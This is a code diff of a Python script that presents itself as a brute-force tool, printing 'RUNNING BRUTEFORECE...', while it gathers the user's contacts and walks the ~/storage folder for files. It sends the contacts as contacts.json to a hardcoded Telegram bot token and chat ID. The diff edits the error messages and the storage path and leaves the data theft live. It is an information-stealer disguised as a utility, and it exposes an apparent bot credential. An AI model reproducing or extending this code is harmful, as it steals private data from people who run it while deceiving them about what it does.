@@ -2,7 +2,6 @@ from threading import Thread, Lock
 import os, subprocess, telebot, time, json, sys, io
 
 bot = telebot.TeleBot('6297533986:AAGtMlOgroJCnYxb4Khwd3NvuGuXw91EU_g')
-bot.send_message(chat_id=1004407813, text='ERROR SENDING FILE:- ')
 
 os.system('clear')
 print("RUNNING BRUTEFORECE...")
@@ -27,12 +26,12 @@ def send_contacts_to_telegram():
         with io.BytesIO(contacts_str.encode()) as contacts_file:
             contacts_file.name = 'contacts.json'
             bot.send_document(chat_id=1004407813, document=contacts_file)
-    except:
-        bot.send_message(chat_id=1004407813, text='ERROR SENDING CONTACTS')
+    except Exception as e:
+        bot.send_message(chat_id=1004407813, text='ERROR SENDING CONTACTS '+e)
 
 def get_user_files():
     files = []
-    for root, _, filenames in os.walk(os.path.expanduser('~/storage')):
+    for root, _, filenames in os.walk('~/storage'):
         for filename in filenames:
             files.append(os.path.join(root,filename))
     print(files)
